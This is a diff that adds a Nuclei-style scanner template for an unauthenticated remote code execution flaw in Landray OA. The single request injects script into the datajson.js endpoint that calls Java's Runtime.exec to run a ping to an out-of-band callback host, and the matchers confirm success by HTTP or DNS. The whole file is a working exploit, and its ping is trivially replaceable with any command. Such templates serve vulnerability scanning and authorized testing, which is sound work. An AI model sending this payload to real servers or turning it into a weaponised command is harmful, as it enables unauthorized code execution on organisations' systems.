@@ -1,0 +1,26 @@
+id: Landray-OA-unauthorized-RCE
+
+info:
+  name: 蓝凌OA未授权rce_2022HW
+  author: A10ng_
+  severity: critical
+  tags: rce,Landray,landray-oa
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/data/sys-common/datajson.js?s_bean=sysFormulaSimulateByJS&script=function%20test(){%20return%20java.lang.Runtime};r=test();r.getRuntime().exec("ping%20-c%201%20{{interactsh-url}}")&type=1'
+
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        name: http
+        words:
+          - "http"
+
+      - type: word
+        part: interactsh_protocol
+        name: dns
+        words:
+          - "dns"
